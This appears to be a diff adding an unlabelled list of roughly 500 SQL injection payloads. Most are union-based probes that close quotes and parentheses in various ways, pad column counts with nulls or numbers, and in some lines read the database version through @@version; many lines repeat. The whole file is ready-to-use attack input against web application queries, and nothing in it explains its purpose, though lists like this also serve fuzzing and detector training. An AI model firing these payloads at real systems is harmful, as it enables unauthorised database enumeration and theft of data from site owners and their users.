@@ -1,0 +1,500 @@
+-3126   )    )    union all select 6718,6718,6718,6718,6718--
+1  )   where 3076  =  3076 union all select null,null,null,null,null--
+-7741'  )   where 8271  =  8271 union all select 8271,8271,8271,8271,8271,8271,8271#
+-5066'   )    )    union all select 9689,9689,9689,9689#
+-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--
+1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--
+1'  )   where 8628  =  8628 union all select null,null,null--
+1   )    )    as xvyi where 6701  =  6701 union all select null,null,null,null#
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-4413%'   )    )    union all select 1345,1345#
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+1' where 7445  =  7445 union all select null,null,null,null,null,null--
+1' in boolean mode  )   union all select null,null,null,null,null,null,null--
+1'  )   where 8628  =  8628 union all select null,null,null--
+-2247'  )   union all select 1202,1202,1202,1202,1202#
+-1368   )    )    union all select 1310,1310,1310,1310,1310#
+-3370' in boolean mode  )   union all select 3432,3432,3432,3432#
+-9774'   )    )     )   union all select 6954,6954,6954#
+-2247'  )   union all select 1202,1202,1202,1202,1202#
+-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--
+-9110"   )    )    union all select 2263,2263,2263,2263,2263#
+-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--
+-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--
+-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-4331  )   as inpx where 9804  =  9804 union all select 9804#
+-9110"   )    )    union all select 2263,2263,2263,2263,2263#
+1 where 4448  =  4448 union all select null,null,null,null,null#
+1'  )   as xhmm where 8092  =  8092 union all select null,null,null--
+1"  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#
+-7858'  )   union all select 1541,1541,1541,1541,1541,1541#
+-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--
+-9039'  )   union all select 8058,8058,8058,8058,8058--
+-2246"   )    )    union all select 4613,4613,4613,4613,4613,4613#
+ select * from users where id  =  1 +$ . union select null,@@VERSION -- 1
+-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--
+ select * from users where id  =  1 or 1#"{ union select 1,version  (    )   -- 1
+-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--
+-9922'   )    )    union all select 2193,2193,2193--
+1"  )   where 1700  =  1700 union all select null,null,null,null,null#
+1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--
+1' in boolean mode  )   union all select null,null,null,null#
+-9039'  )   union all select 8058,8058,8058,8058,8058--
+-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#
+1' where 4358  =  4358 union all select null,null,null,null--
+-7043"  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#
+-2899"   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--
+-3361   )    )    union all select 2827,2827,2827,2827#
+1%'   )    )     )   union all select null,null,null,null,null--
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+-5313'  )   union all select 7187,7187,7187#
+1"   )    )    as iqgd where 7611  =  7611 union all select null,null,null,null,null#
+-8707'  )   union all select 5609,5609,5609--
+-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#
+-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--
+-9389' where 5713  =  5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--
+1"   )    )    union all select null,null,null,null--
+1'  )   where 8628  =  8628 union all select null,null,null--
+1"   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--
+-6155%'   )    )    union all select 2421,2421,2421,2421,2421#
+1'  )   where 5799  =  5799 union all select null,null,null,null,null--
+-7043"  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#
+-1647'   )    )    union all select 3030,3030,3030,3030,3030,3030,3030--
+1' in boolean mode  )   union all select null,null,null,null--
+1 union all select null,null,null,null--
+1"   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--
+1'   )    )    as fwhv where 3921  =  3921 union all select null,null--
+1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--
+1 where 6412  =  6412 union all select null,null,null,null,null,null,null--
+-8419  )   where 8692  =  8692 union all select 8692,8692,8692--
+1'  )   as xhmm where 8092  =  8092 union all select null,null,null--
+-4772   )    )     )   union all select 3879,3879,3879,3879,3879--
+-8833'   )    )    union all select 3227,3227,3227,3227,3227--
+1' union all select null,null,null,null,null,null--
+1"  )   where 9770  =  9770 union all select null,null,null,null,null,null--
+ select * from users where id  =  1 union select @<@$,version  (    )   -- 1
+-7007  )   union all select 6704,6704--
+1"  )   where 1700  =  1700 union all select null,null,null,null,null#
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-1368   )    )    union all select 1310,1310,1310,1310,1310#
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+ select * from users where id  =  1 union select !<1,version  (    )   -- 1
+-9574%'   )    )    union all select 5645,5645,5645,5645,5645,5645,5645--
+-2247'  )   union all select 1202,1202,1202,1202,1202#
+1'  )   where 8268  =  8268 union all select null,null,null,null--
+1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--
+ select * from users where id  =  '1' union select \.#,@@VERSION -- 1'
+-9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743--
+-7007  )   union all select 6704,6704--
+-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--
+-6593"  )   union all select 6216,6216,6216,6216,6216,6216,6216#
+-5150   )    )     )   union all select 5660,5660,5660#
+1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+-8771"   )    )    union all select 6302,6302,6302,6302,6302#
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+-6292  )   union all select 7499,7499,7499,7499,7499,7499,7499--
+-4093'   )    )    union all select 5785,5785,5785#
+-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--
+-4318"  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--
+1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--
+ select * from users where id  =  1 union select 1 $$,version  (    )   -- 1
+-2929"   )    )     )   union all select 8999,8999#
+-4772   )    )     )   union all select 3879,3879,3879,3879,3879--
+-8943%'  )   union all select 7710,7710#
+-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--
+-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--
+1"  )   where 9770  =  9770 union all select null,null,null,null,null,null--
+-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#
+union all select @@version--
+-9904"   )    )    union all select 9080,9080,9080,9080,9080--
+-7069  )   union all select 6638,6638,6638,6638,6638,6638--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--
+-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--
+-4707' union all select 4414,4414,4414,4414,4414,4414#
+-7683"  )   where 9664  =  9664 union all select 9664,9664,9664,9664,9664,9664,9664#
+-6116"   )    )    union all select 3679,3679,3679,3679,3679,3679,3679--
+-8735'   )    )    union all select 3262,3262,3262--
+-1451%'  )   union all select 7666,7666,7666#
+-3361   )    )    union all select 2827,2827,2827,2827#
+1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#
+-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#
+1%'   )    )    union all select null,null,null,null,null,null--
+-5389'||  (  select 'gggl' where 1020  =  1020 union all select 1020#
+1'  )   as xhmm where 8092  =  8092 union all select null,null,null--
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+1   )    )    as jzzo where 7773  =  7773 union all select null,null,null,null,null#
+-1368   )    )    union all select 1310,1310,1310,1310,1310#
+-4692%"   )    )    union all select 1781,1781#
+-4707' union all select 4414,4414,4414,4414,4414,4414#
+-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--
+-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#
+ select * from users where id  =  '1' union select @ @1,version  (    )   --  1'
+1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--
+1' in boolean mode  )   union all select null,null,null,null,null,null#
+-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#
+-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--
+1  )   where 3915  =  3915 union all select null,null,null,null#
+1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--
+-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#
+-9361"   )    )    union all select 3112#
+-9256"   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--
+-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#
+1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--
+-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#
+1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--
+-2384%'   )    )    union all select 2467,2467,2467,2467#
+1'  )   as wtfo where 5666  =  5666 union all select null,null,null,null--
+1"   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--
+-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--
+1" where 4183  =  4183 union all select null,null,null,null,null,null--
+ select * from users where id  =  1 union select !<1,version  (    )   -- 1
+-2899"   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--
+ select * from users where id  =  1 or 1#"  (   union select null,version  (    )   -- 1
+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+1' in boolean mode  )   union all select null,null,null--
+-1949"   )    )    as urke where 8761  =  8761 union all select 8761,8761,8761,8761,8761,8761,8761#
+1  )   where 3076  =  3076 union all select null,null,null,null,null--
+-3794'  )   union all select 2485,2485,2485,2485,2485--
+-4093'   )    )    union all select 5785,5785,5785#
+1'  )   where 8268  =  8268 union all select null,null,null,null--
+1"  )   where 9770  =  9770 union all select null,null,null,null,null,null--
+-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#
+-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#
+1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+1'  )   where 5799  =  5799 union all select null,null,null,null,null--
+-2790%"  )   union all select 5070,5070#
+ select * from users where id  =  1.  union select 1,version  (    )   -- 1
+1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--
+1 where 2751  =  2751 union all select null,null,null,null--
+-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#
+1  )   where 3076  =  3076 union all select null,null,null,null,null--
+1%"   )    )    union all select null,null,null,null,null#
+1'  )   as dwgv where 1525  =  1525 union all select null,null--
+-6600'  )   union all select 5566,5566#
+-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--
+1'  )   where 8268  =  8268 union all select null,null,null,null--
+-4707' union all select 4414,4414,4414,4414,4414,4414#
+1"  )   union all select null,null,null,null,null,null--
+-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#
+-3370' in boolean mode  )   union all select 3432,3432,3432,3432#
+1' in boolean mode  )   union all select null,null,null,null--
+ select * from users where id  =  1 or 1#"@ union select null,version  (    )   -- 1
+-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#
+-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--
+-4347' union all select 6074,6074,6074,6074,6074,6074,6074--
+-9774'   )    )     )   union all select 6954,6954,6954#
+1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--
+-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--
+-2246"   )    )    union all select 4613,4613,4613,4613,4613,4613#
+-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#
+-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--
+-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#
+-9039'  )   union all select 8058,8058,8058,8058,8058--
+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+-3725'   )    )    union all select 1541,1541,1541,1541,1541#
+-8203"  )   union all select 6394,6394,6394,6394,6394--
+-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--
+-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#
+-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#
+-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--
+1'  )   where 8268  =  8268 union all select null,null,null,null--
+ select * from users where id  =  1 or 1#"@ union select null,version  (    )   -- 1
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-5548' where 4477  =  4477 union all select 4477,4477,4477,4477,4477,4477,4477,4477,4477,4477--
+1  )   where 3076  =  3076 union all select null,null,null,null,null--
+1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--
+-7069  )   union all select 6638,6638,6638,6638,6638,6638--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#
+1" where 1452  =  1452 union all select null,null,null,null--
+ select * from users where id  =  1 or 1#"1 union select 1,version  (    )   -- 1
+-3441'   )    )    as dxvt where 9291  =  9291 union all select 9291,9291,9291#
+-2417  )   union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#
+1   )    )    as mgvw where 4923  =  4923 union all select null,null,null,null--
+-4182   )    )    as wkfh where 6145  =  6145 union all select 6145,6145,6145,6145,6145#
+-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--
+1"  )   where 8702  =  8702 union all select null,null,null,null,null--
+1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--
+1   )    )    as fynx where 9636  =  9636 union all select null,null,null,null,null--
+-8021"  )   union all select 1166,1166,1166,1166--
+1'  )   where 8268  =  8268 union all select null,null,null,null--
+ select * from users where id  =  1 or 1#"@ union select 1,version  (    )   -- 1
+1 where 1326  =  1326 union all select null,null,null,null,null,null--
+-2247'  )   union all select 1202,1202,1202,1202,1202#
+1' in boolean mode  )   union all select null,null,null,null,null,null#
+ select * from users where id  =  1 or 1#", union select 'a',version  (    )   -- 1
+1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-1097" where 4421  =  4421 union all select 4421,4421,4421,4421,4421#
+-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#
+-5205'   )    )    union all select 8592,8592,8592,8592,8592,8592--
+-4236  )   union all select 5260,5260,5260,5260,5260,5260,5260,5260,5260#
+ select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1
+-5706"   )    )    union all select 2013,2013,2013,2013#
+1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#
+-7868' in boolean mode  )   union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#
+1" where 4808  =  4808 union all select null,null,null,null,null,null,null#
+1'   )    )    as vwua where 8099  =  8099 union all select null--
+1' union all select null,null,null,null,null,null--
+-7142'   )    )    union all select 5083,5083,5083,5083#
+1%'  )   union all select null,null,null,null,null--
+-2246"   )    )    union all select 4613,4613,4613,4613,4613,4613#
+1' in boolean mode  )   union all select null,null,null,null,null,null,null--
+1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--
+-1368   )    )    union all select 1310,1310,1310,1310,1310#
+-9382'  )   union all select 4774,4774,4774,4774--
+1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--
+1'  )   where 8268  =  8268 union all select null,null,null,null--
+1'  )   where 8268  =  8268 union all select null,null,null,null--
+1"  )   where 8702  =  8702 union all select null,null,null,null,null--
+1  )   as lejp where 5238  =  5238 union all select null,null,null,null,null#
+1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--
+-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#
+-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#
+-5425 where 5933  =  5933 union all select 5933,5933,5933--
+-2006'   )    )    union all select 7852,7852,7852,7852,7852--
+-9175'   )    )    union all select 6174,6174,6174,6174--
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#
+-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#
+1" union all select null,null,null,null,null,null,null,null,null,null#
+1%'   )    )    union all select null,null,null,null--
+-9110"   )    )    union all select 2263,2263,2263,2263,2263#
+-3781  )   union all select 3916,3916,3916--
+1"   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--
+-3794'  )   union all select 2485,2485,2485,2485,2485--
+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+1  )   as ghew where 6441  =  6441 union all select null,null--
+-7142'   )    )    union all select 5083,5083,5083,5083#
+1" where 4808  =  4808 union all select null,null,null,null,null,null,null#
+1"   )    )    union all select null,null,null,null,null,null,null--
+-9532   )    )    union all select 6039,6039,6039,6039--
+1"   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--
+-1244  )   as qszw where 2332  =  2332 union all select 2332,2332,2332,2332#
+1' in boolean mode  )   union all select null,null--
+-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--
+-3960"   )    )    union all select 7813,7813,7813,7813,7813,7813--
+-6940'  )   union all select 3042,3042,3042,3042,3042#
+-4331  )   as inpx where 9804  =  9804 union all select 9804#
+1  )   where 8630  =  8630 union all select null,null--
+-1368   )    )    union all select 1310,1310,1310,1310,1310#
+1"   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--
+-8833'   )    )    union all select 3227,3227,3227,3227,3227--
+1'  )   where 4509  =  4509 union all select null--
+-2247'  )   union all select 1202,1202,1202,1202,1202#
+-9904"   )    )    union all select 9080,9080,9080,9080,9080--
+-2006'   )    )    union all select 7852,7852,7852,7852,7852--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#
+-1823 where 6852  =  6852 union all select 6852,6852,6852,6852,6852,6852#
+-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--
+ select * from users where id  =  1 or 1#". union select null,version  (    )   -- 1
+-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--
+-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#
+-3205"  )   union all select 5233,5233,5233,5233#
+ select * from users where id  =  1 or 1#"@ union select null,version  (    )   -- 1
+-6155%'   )    )    union all select 2421,2421,2421,2421,2421#
+-6155%'   )    )    union all select 2421,2421,2421,2421,2421#
+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--
+-3282'  )   union all select 9002,9002,9002,9002,9002#
+-3370' in boolean mode  )   union all select 3432,3432,3432,3432#
+-2247'  )   union all select 1202,1202,1202,1202,1202#
+-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--
+ select * from users where id  =  '1' union select @ @1,version  (    )   --  1'
+-6096'  )   where 1316  =  1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#
+-5385" union all select 4577,4577,4577,4577,4577,4577,4577#
+1'  )   where 8268  =  8268 union all select null,null,null,null--
+-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#
+-7122"  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#
+1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--
+-4826 union all select 4532,4532,4532,4532,4532--
+-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--
+-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--
+-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--
+-4152"  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--
+1"  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--
+1' in boolean mode  )   union all select null,null,null,null,null,null,null#
+-7601"   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--
+1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--
+-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--
+-9583%"   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--
+1"  )   union all select null,null,null,null,null--
+-1432"   )    )    union all select 9008,9008,9008#
+1'  )   where 5799  =  5799 union all select null,null,null,null,null--
+ select * from users where id  =  1 union select 1`\`,version  (    )   -- 1
+-6593"  )   union all select 6216,6216,6216,6216,6216,6216,6216#
+-8178  )   union all select 4163,4163,4163,4163,4163,4163,4163--
+-1755%' union all select 2615,2615,2615,2615,2615,2615#
+1"   )    )    union all select null,null,null,null,null,null,null--
+-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-9582'  )   where 4397  =  4397 union all select 4397,4397,4397#
+-9565" where 1616  =  1616 union all select 1616,1616,1616,1616--
+-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#
+-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#
+-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#
+-7795"  )   where 1712  =  1712 union all select 1712,1712,1712,1712#
+-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+-7008'   )    )    union all select 9080,9080,9080#
+-4093'   )    )    union all select 5785,5785,5785#
+1" where 2878  =  2878 union all select null,null,null,null,null#
+1%"   )    )    union all select null,null,null,null,null#
+-1647'   )    )    union all select 3030,3030,3030,3030,3030,3030,3030--
+1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--
+1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--
+1'  )   as gogu where 4338  =  4338 union all select null#
+1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#
+-6155%'   )    )    union all select 2421,2421,2421,2421,2421#
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1"  )   union all select null,null,null,null,null,null,null--
+-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--
+-1015"   )    )    union all select 6624,6624#
+1"  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--
+1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--
+1'  )   where 8268  =  8268 union all select null,null,null,null--
+-1188   )    )    union all select 4711--
+-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--
+-4756"   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#
+-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#
+-8812"  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--
+1' in boolean mode  )   union all select null--
+-2701"   )    )    as wvht where 5401  =  5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#
+-8809'||  (  select 'hyzr' where 5694  =  5694 union all select 5694--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#
+-1368   )    )    union all select 1310,1310,1310,1310,1310#
+-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#
+ select * from users where id  =  1 union select @ $$,version  (    )   -- 1
+1'  )   where 5799  =  5799 union all select null,null,null,null,null--
+-5643'   )    )    union all select 1515,1515#
+1"  )   where 2088  =  2088 union all select null,null,null,null--
+1"  )   where 1700  =  1700 union all select null,null,null,null,null#
+1"   )    )     )   union all select null,null,null,null,null,null--
+-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#
+-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--
+1"  )   union all select null,null,null--
+1"  )   where 1870  =  1870 union all select null,null,null,null,null,null,null,null--
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+ select * from users where id  =  1 or 1#"@ union select 1,version  (    )   -- 1
+-9175'   )    )    union all select 6174,6174,6174,6174--
+1' in boolean mode  )   union all select null,null,null,null,null,null,null--
+-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#
+-8794   )    )     )   union all select 5802,5802,5802--
+-3960"   )    )    union all select 7813,7813,7813,7813,7813,7813--
+1'||  (  select 'owzs' where 1475  =  1475 union all select null--
+1"  )   as hymr where 5497  =  5497 union all select null,null,null,null--
+-7795"  )   where 1712  =  1712 union all select 1712,1712,1712,1712#
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3853"  )   where 4626  =  4626 union all select 4626,4626,4626--
+-3116"   )    )     )   union all select 4600,4600,4600,4600--
+-6096'  )   where 1316  =  1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#
+1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#
+-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#
+1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--
+-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--
+-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#
+ select * from users where id  =  '1' union select $ .,@@VERSION -- 1'
+-4772   )    )     )   union all select 3879,3879,3879,3879,3879--
+-9596  )   where 3425  =  3425 union all select 3425,3425,3425,3425,3425,3425#
+1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--
+1"   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--
+-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--
+ select * from users where id  =  1 or 1#"{ union select 1,version  (    )   -- 1
+1'  )   as ildf where 5545  =  5545 union all select null,null,null,null#
+-3885  )   where 2387  =  2387 union all select 2387,2387,2387,2387,2387,2387,2387#
+-1573"  )   union all select 3928,3928,3928,3928--
+1'+  (  select 'xqpe' where 4020  =  4020 union all select null,null--
+-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#
+1"  )   union all select null,null,null--
+-8021"  )   union all select 1166,1166,1166,1166--
+-1368   )    )    union all select 1310,1310,1310,1310,1310#
+-8369"   )    )    union all select 2191--
+1' in boolean mode  )   union all select null,null--
+1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--
+-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--
+1 union all select null,null,null,null,null--
+1"  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--
+-8419  )   where 8692  =  8692 union all select 8692,8692,8692--
+1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#
+-8021"  )   union all select 1166,1166,1166,1166--
+-3205"  )   union all select 5233,5233,5233,5233#
+1"  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--
+-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#
+1%'   )    )    union all select null,null,null,null--
+union all select @@version--
+1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--
+-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--
+ select * from users where id  =  1 union select @ $$,version  (    )   -- 1
+-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#
+-5657'   )    )     )   union all select 8071,8071,8071,8071,8071,8071,8071,8071#
+ select * from users where id  =  1 union select 1`\`,version  (    )   -- 1
+-7008'   )    )    union all select 9080,9080,9080#
+-6527'   )    )    union all select 5053,5053,5053,5053--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+1   )    )    as fynx where 9636  =  9636 union all select null,null,null,null,null--
+1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--
+1'  )   where 8268  =  8268 union all select null,null,null,null--
+1 where 1992  =  1992 union all select null,null--
+ select * from users where id  =  1 or 1#". union select null,version  (    )   -- 1
+ select * from users where id  =  '1' union select @ @1,version  (    )   --  1'
+-9175'   )    )    union all select 6174,6174,6174,6174--
+1  )   where 8630  =  8630 union all select null,null--
+1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--
+ select * from users where id  =  1 +$ . union select null,@@VERSION -- 1
+-9337  )   union all select 5648,5648,5648,5648,5648#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-4318"  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--
+1"  )   where 5870  =  5870 union all select null,null,null--
+-8735'   )    )    union all select 3262,3262,3262--
